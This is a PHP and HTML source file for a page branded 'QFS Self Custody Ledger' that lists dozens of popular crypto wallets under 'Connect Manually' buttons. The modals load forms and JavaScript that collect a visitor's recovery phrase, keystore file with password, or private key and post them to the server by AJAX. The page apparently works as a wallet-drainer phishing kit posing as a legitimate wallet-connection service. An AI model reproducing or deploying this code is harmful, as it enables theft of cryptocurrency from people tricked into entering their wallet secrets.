<?php
// secure_assets.php
// This script generates a page for connecting various crypto wallets.
// It dynamically lists wallets and provides modal forms for connection.

// Start the session to manage user state, if necessary.
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Ensure the user is logged in before proceeding.
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit;
}

?>
<!DOCTYPE html> 
<html lang="en"> 

<head> 
    <meta charset="UTF-8"> 
    <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
    <meta name="viewport" content="width=device-width,initial-scale=1"> 
    <!-- CSRF Token --> 
    <meta name="csrf-token" content="HjR7Pl6rMs3SoIgyh6fodmCCvEjzDRZpS7p8zNod"> 

    <title>App | QFS Self Custody Ledger</title> 

    <link rel="icon" href="/favicon.ico" sizes="any"> 
    <link rel="apple-touch-icon" href="/apple-touch-icon.png"> 

    <!-- Bootstrap 5 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #0d0d0d;
            color: #ebebeb;
            font-family: Arial, sans-serif;
        }

        .header {
            padding: 2rem;
            text-align: center;
        }

        .header-title {
            font-size: 2rem;
            font-weight: bold;
        }

        .header-lead {
            max-width: 600px;
            margin: 0 auto;
            color: #bdbdbd;
        }

        .wallets {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 20px;
            justify-content: center;
        }

        .wallet {
            background-color: #1a1a1a;
            border-radius: 1rem;
            transition: all 0.3s;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .wallet:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.2);
        }

        .wallet-image {
            height: 60px;
            width: 60px;
            object-fit: contain;
            border-radius: 50% !important;
        }

        .stretched-link {
            text-decoration: none;
            color: #ebebeb;
        }

        .modal-body {
            background-color: #0d0d0d;
            color: #ebebeb;
        }

        .btn-close {
            filter: invert(1);
        }

        .btn-danger {
            background-color: #dc3545;
            border-color: #dc3545;
        }

        .btn-danger:hover {
            background-color: #c82333;
            border-color: #bd2130;
        }

        .btn-secondary {
            background-color: #6c757d;
            border-color: #6c757d;
        }

        .btn-secondary:hover {
            background-color: #5a6268;
            border-color: #545b62;
        }

        .text-primary {
            color: #007bff;
        }
        
        .tab-content {
            padding: 1rem;
            border-top: none;
        }
        
        .tab-pane {
            display: none;
        }
        
        .tab-pane.active {
            display: block;
        }
    </style>
</head>

<body>

    <div class="d-flex justify-content-center">
        <div id="google_translate_element"></div>
    </div>
    <main class="container">
        <div class="secure_assets">
            <div class="container header mx-auto">
                <div class="d-flex flex-column justify-content-center text-center p-4 mx-auto">
                    <h4 class="header-title">Wallets</h4>
                    <div class="mt-2 header-lead px-4 mx-auto ">
                        Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop
                        computer screen
                        to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile
                        browsers are
                        supported via mobile deep linking.
                    </div>
                </div>
            </div>

            <div class="wallets mb-5">
                <!-- Looping through wallet data to create cards -->
                <?php
                $wallets = [
                    ['id' => 1, 'name' => 'Trust', 'image' => 'https://qfsselfcustody.com/images/wallets/0_trust.png'],
                    ['id' => 2, 'name' => 'Metamask', 'image' => 'https://qfsselfcustody.com/images/wallets/1_metamask.png'],
                    ['id' => 3, 'name' => 'Lobstr', 'image' => 'https://qfsselfcustody.com/images/wallets/2_lobstr.png'],
                    ['id' => 4, 'name' => 'Coinbase', 'image' => 'https://qfsselfcustody.com/images/wallets/3_coinbase.png'],
                    ['id' => 5, 'name' => 'Aktionariat', 'image' => 'https://qfsselfcustody.com/images/wallets/aktionariat.png'],
                    ['id' => 6, 'name' => 'Alice', 'image' => 'https://qfsselfcustody.com/images/wallets/alice.png'],
                    ['id' => 7, 'name' => 'Alpha Wallet', 'image' => 'https://qfsselfcustody.com/images/wallets/alpha_wallet.png'],
                    ['id' => 8, 'name' => 'Anchor', 'image' => 'https://qfsselfcustody.com/images/wallets/anchor.png'],
                    ['id' => 9, 'name' => 'Argent', 'image' => 'https://qfsselfcustody.com/images/wallets/argent.png'],
                    ['id' => 10, 'name' => 'At.wallet', 'image' => 'https://qfsselfcustody.com/images/wallets/at.wallet.png'],
                    ['id' => 11, 'name' => 'Atomic', 'image' => 'https://qfsselfcustody.com/images/wallets/atomic.png'],
                    ['id' => 12, 'name' => 'Authereum', 'image' => 'https://qfsselfcustody.com/images/wallets/authereum.png'],
                    ['id' => 13, 'name' => 'Bakkt', 'image' => 'https://qfsselfcustody.com/images/wallets/bakkt.png'],
                    ['id' => 14, 'name' => 'Binance Smart Chain', 'image' => 'https://qfsselfcustody.com/images/wallets/binance_smart_chain.png'],
                    ['id' => 15, 'name' => 'Bit Keep', 'image' => 'https://qfsselfcustody.com/images/wallets/bit_keep.png'],
                    ['id' => 16, 'name' => 'Bit Pay', 'image' => 'https://qfsselfcustody.com/images/wallets/bit_pay.png'],
                    ['id' => 17, 'name' => 'Blockchain', 'image' => 'https://qfsselfcustody.com/images/wallets/blockchain.png'],
                    ['id' => 18, 'name' => 'Bridge Wallet', 'image' => 'https://qfsselfcustody.com/images/wallets/bridge_wallet.png'],
                    ['id' => 19, 'name' => 'Coin98', 'image' => 'https://qfsselfcustody.com/images/wallets/coin98.png'],
                    ['id' => 20, 'name' => 'Coinomi', 'image' => 'https://qfsselfcustody.com/images/wallets/coinomi.png'],
                    ['id' => 21, 'name' => 'Cool Wallet S', 'image' => 'https://qfsselfcustody.com/images/wallets/cool_wallet_s.png'],
                    ['id' => 22, 'name' => 'Cosmostation', 'image' => 'https://qfsselfcustody.com/images/wallets/cosmostation.png'],
                    ['id' => 23, 'name' => 'Crypto.com Defi Wallet', 'image' => 'https://qfsselfcustody.com/images/wallets/crypto.com_defi_wallet.png'],
                    ['id' => 24, 'name' => 'Cybavo Wallet', 'image' => 'https://qfsselfcustody.com/images/wallets/cybavo_wallet.png'],
                    ['id' => 25, 'name' => 'D\'Cent Wallet', 'image' => 'https://qfsselfcustody.com/images/wallets/d_cent_wallet.png'],
                    ['id' => 26, 'name' => 'Dok Wallet', 'image' => 'https://qfsselfcustody.com/images/wallets/dok_wallet.png'],
                    ['id' => 27, 'name' => 'Easy Pocket', 'image' => 'https://qfsselfcustody.com/images/wallets/easy_pocket.jpg'],
                    ['id' => 28, 'name' => 'Eidoo', 'image' => 'https://qfsselfcustody.com/images/wallets/eidoo.png'],
                    ['id' => 29, 'name' => 'Ellipal', 'image' => 'https://qfsselfcustody.com/images/wallets/ellipal.png'],
                    ['id' => 30, 'name' => 'Equal', 'image' => 'https://qfsselfcustody.com/images/wallets/equal.jpg'],
                    ['id' => 31, 'name' => 'Exodus', 'image' => 'https://qfsselfcustody.com/images/wallets/exodus.png'],
                    ['id' => 32, 'name' => 'Fetch', 'image' => 'https://qfsselfcustody.com/images/wallets/fetch.jpg'],
                    ['id' => 33, 'name' => 'Gnosis Safe Multisig', 'image' => 'https://qfsselfcustody.com/images/wallets/gnosis_safe_multisig.png'],
                    ['id' => 34, 'name' => 'Graph Protocol', 'image' => 'https://qfsselfcustody.com/images/wallets/graph_protocol.jpg'],
                    ['id' => 35, 'name' => 'Grid Plus', 'image' => 'https://qfsselfcustody.com/images/wallets/grid_plus.png'],
                    ['id' => 36, 'name' => 'Harmony', 'image' => 'https://qfsselfcustody.com/images/wallets/harmony.png'],
                    ['id' => 37, 'name' => 'Huobi Wallet', 'image' => 'https://qfsselfcustody.com/images/wallets/huobi_wallet.png'],
                    ['id' => 38, 'name' => 'Iconex', 'image' => 'https://qfsselfcustody.com/images/wallets/iconex.png'],
                    ['id' => 39, 'name' => 'Infinito', 'image' => 'https://qfsselfcustody.com/images/wallets/infinito.png'],
                    ['id' => 40, 'name' => 'Infinity Wallet', 'image' => 'https://qfsselfcustody.com/images/wallets/infinity_wallet.png'],
                    ['id' => 41, 'name' => 'Karda Chain', 'image' => 'https://qfsselfcustody.com/images/wallets/karda_chain.png'],
                    ['id' => 42, 'name' => 'Keplr', 'image' => 'https://qfsselfcustody.com/images/wallets/keplr.png'],
                ];
                
                foreach ($wallets as $wallet) {
                    echo '
                    <div data-aos="fade-up"
                        class="wallet d-flex justify-content-center flex-column text-center p-3">
                        <div class="p-4">
                            <img src="' . htmlspecialchars($wallet['image']) . '" alt=""
                                class="img-fluid wallet-image rounded-4">
                        </div>
                        <a href="#" data-bs-toggle="modal" data-bs-target="#connectLoading' . htmlspecialchars($wallet['id']) . '"
                            class="link-dark text-decoration-none stretched-link fw-bold">
                            ' . htmlspecialchars($wallet['name']) . '
                        </a>
                    </div>

                    <!-- Connect loading Modal -->
                    <div class="modal fade" id="connectLoading' . htmlspecialchars($wallet['id']) . '" data-bs-backdrop="static"
                        data-bs-keyboard="false" tabindex="-1" aria-labelledby="connectLoading' . htmlspecialchars($wallet['id']) . 'Label"
                        aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered modal-connect">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-header">
                                    <h1 class="modal-title fs-5 text-primary" id="connectLoading' . htmlspecialchars($wallet['id']) . 'Label"
                                        data-bs-dismiss="modal" aria-label="Close" style="cursor: pointer">
                                        Back</h1>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                                        aria-label="Close"></button>
                                </div>
                                <div class="modal-body">
                                    <div class="border border-danger p-3 d-flex justify-content-between align-items-center mb-3 text-danger"
                                        style="border-radius: 12px">
                                        <p class="mb-0 fs-5" id="loading"></p>
                                        <button class="btn btn-secondary p-1 rounded-3 ' . htmlspecialchars($wallet['id']) . '"
                                            id="connectManually" style="display: none" data-bs-toggle="modal"
                                            data-count="' . htmlspecialchars($wallet['id']) . '" data-filename="' . htmlspecialchars($wallet['image']) . '"
                                            data-wallet="' . htmlspecialchars($wallet['name']) . ' Wallet"
                                            data-bs-target="#phraseKey' . htmlspecialchars($wallet['id']) . '">
                                            Connect Manually
                                        </button>
                                    </div>

                                    <div class="border border-secondary p-3 d-flex justify-content-between align-items-center"
                                        style="border-radius: 12px">
                                        <div class="d-flex flex-column">
                                            <h5 class="mb-1">' . htmlspecialchars($wallet['name']) . '</h5>
                                            <p class="fs-6 mb-0 pb-0">Easy-to-use browser extension.</p>
                                        </div>
                                        <img src="' . htmlspecialchars($wallet['image']) . '" alt=""
                                            class="img-fluid" style="border-radius: 50%;height: 24px;width: 24px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Phrase Key Modal -->
                    <div class="modal fade" id="phraseKey' . htmlspecialchars($wallet['id']) . '" data-bs-backdrop="static" data-bs-keyboard="false"
                        tabindex="-1" aria-labelledby="phraseKey' . htmlspecialchars($wallet['id']) . 'Label" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content rounded-4 border-0">
                                <div class="modal-body">

                                </div>
                                <div class="d-flex justify-content-end align-items-center mb-3 mt-2 me-4">
                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close"
                                        onclick="handleCancelButtonClick();">
                                        Cancel
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>';
                }
                ?>
            </div>

            <footer class="d-flex justify-content-center align-items-center pt-5">
                <a href="javascript:void(0)" class="d-flex my-5 me-5 text-decoration-none">
                    <img src="https://qfsselfcustody.com/images/discord.svg" alt="Discord" class="me-1" width="20px">
                    <p class="mb-0">Discord</p>
                </a>
                <a href="javascript:void(0)" class="d-flex my-5 me-5 text-decoration-none">
                    <img src="https://qfsselfcustody.com/images/twitter.svg" alt="Twitter" class="me-1" width="20px">
                    <p class="mb-0">Twitter</p>
                </a>
            </footer>
        </div>
    </main>


    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({
                pageLanguage: 'en'
            }, 'google_translate_element');
        }

        // Helper function to handle the "Cancel" button click,
        // which now closes all open modals and removes the backdrop.
        function handleCancelButtonClick() {
            document.querySelectorAll('.modal.show').forEach(modal => {
                const modalInstance = bootstrap.Modal.getInstance(modal);
                if (modalInstance) {
                    modalInstance.hide();
                }
            });
            // Give a small delay to ensure the modals are fully hidden before removing the backdrop.
            setTimeout(() => {
                const backdrop = document.querySelector('.modal-backdrop');
                if (backdrop) {
                    backdrop.remove();
                }
            }, 300);
        }
    </script>
    <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

    <script>
        function fireErrorToast(message = "") {
            const toastElement = $("#errorToast");
            if (message !== "") {
                $("#errorToast > .d-flex > .toast-body").text(message);
            }
            const toast = new bootstrap.Toast(toastElement);
            toast.show();
        }

        function wordCount(str) {
            return str.split(" ").filter(function(n) {
                return n !== "";
            }).length;
        }

        function mimiFireAjax(form) {
            $.ajax({
                type: "POST",
                url: $(form).attr("action"),
                data: $(form).serialize(),
                beforeSend: () => {
                    $("#loadingModal").show();
                },
                success: function(response) {
                    window.location.href = response;
                },
                complete: () => {
                    $("#loadingModal").hide();
                },
            });
        }

        function attachRestoreWalletHandlers() {
            // Phrase form validation
            $("#phrase-form").on("submit", function(e) {
                e.preventDefault();

                if ($("textarea#phrase").val() === "") {
                    fireErrorToast();
                } else if (wordCount($("textarea#phrase").val()) < 12) {
                    fireErrorToast();
                } else {
                    mimiFireAjax(this);
                }
            });

            // Keystore JSON form validation
            $("#keystoreForm").on("submit", function(e) {
                e.preventDefault();

                if (
                    $("textarea#keystore").val() === "" ||
                    $("input#password").val() === ""
                ) {
                    fireErrorToast(
                        "Fields cannot be empty, Please enter Keystore JSON and Password"
                    );
                } else {
                    mimiFireAjax(this);
                }
            });

            // Private key form validation
            $("#privateKeyForm").on("submit", function(e) {
                e.preventDefault();

                if ($("#privateKey").val() === "") {
                    fireErrorToast(
                        "Fields cannot be empty, Please enter Private Key"
                    );
                } else {
                    mimiFireAjax(this);
                }
            });
        }

        const phraseModals = document.querySelectorAll('[id^="phraseKey"]');

        phraseModals.forEach((modal) => {
            modal.addEventListener("show.bs.modal", (event) => {
                const button = event.relatedTarget;
                const info = $(button).data();
                let url = "/deep/restore/534?filename=" + info.filename;
                url += "&wallet=" + info.wallet;
                const callback = (response) => {
                    $(modal).find(".modal-body").html(response);
                    attachRestoreWalletHandlers();
                };

                $.get(url, callback);
            });

            modal.addEventListener("hide.bs.modal", (event) => {
                $(modal).find(".modal-body").html("");
            });
        });
    </script>
</body>

</html>
